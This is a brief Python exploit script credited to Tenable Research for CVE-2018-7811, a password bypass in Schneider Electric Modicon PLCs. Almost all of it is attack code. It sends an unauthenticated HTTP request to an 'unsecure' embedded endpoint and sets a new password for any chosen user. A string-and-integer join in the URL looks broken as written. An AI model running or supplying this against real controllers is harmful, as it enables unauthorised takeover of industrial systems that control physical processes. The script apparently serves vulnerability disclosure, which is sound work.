##
# Exploit Title: Schneider Electric Modicon Quantum password bypass
# Date: 06/11/2019
# Exploit Author: Tenable Research
# CVE : CVE-2018-7811
# Advisory: https://www.tenable.com/security/research/tra-2018-38
# Affected Vendors/Device/Firmware:
#  - Modicon M340
#  - Modicon Premium
#  - Modicon Quantum
#  - Modicon BMXNOR0200
##

import urllib.request, argparse

parser = argparse.ArgumentParser()
parser.add_argument("target_host", help="Modicon Quantum host") 
parser.add_argument("target_port", help="Modicon Quantum port (ie. 80)", type=int) 
parser.add_argument("target_user", help="Username (ie. admin)") 
parser.add_argument("new_pass", help="New password") 
args = parser.parse_args()
  
host = args.target_host
port = args.target_port
user = args.target_user
newpass = args.new_pass

with urllib.request.urlopen('http://'+host+':'+port+'/unsecure/embedded/builtin?Language=English&user='+user+'&passwd='+newpass+'&cnfpasswd='+newpass+'&subhttppwd=Save+User') as f:
    print(f.read(300))
